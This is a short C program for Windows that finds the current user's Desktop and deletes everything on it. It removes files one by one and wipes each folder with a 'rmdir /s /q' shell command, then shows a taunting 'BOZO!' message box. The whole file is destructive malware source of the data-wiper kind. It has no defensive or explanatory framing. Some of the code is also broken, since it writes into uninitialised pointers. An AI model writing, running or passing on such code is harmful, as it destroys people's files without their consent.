#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <dirent.h>
#include <sys/stat.h>
#define NIL NULL        //i need to do that.

void flame(char * element){
    SetCursorPos(10, 10);
    remove(element);
}

int recognize_dir(char *file){
    struct stat isdir;
    stat(file, &isdir);
    return S_ISREG(isdir.st_mode);
}

int main(){
    DIR *ls;
    char *sus, *file, *deldir;
    struct dirent *dir;
    wchar_t *sussybaka = _wgetenv(L"USERPROFILE");
    sprintf(sus, "%ls\\Desktop", sussybaka);
    chdir(sus);
    ls = opendir(".");
    if(ls){
        while((dir = readdir(ls)) != NIL){
            file = dir->d_name;
            if(recognize_dir(file)==0){
                sprintf(deldir, "rmdir /s /q %s", file);
                system(deldir);
            } else flame(file);
        }
        closedir(ls);
    }
    MessageBox(NIL, "BOZO!", __FILE__, 1);
}
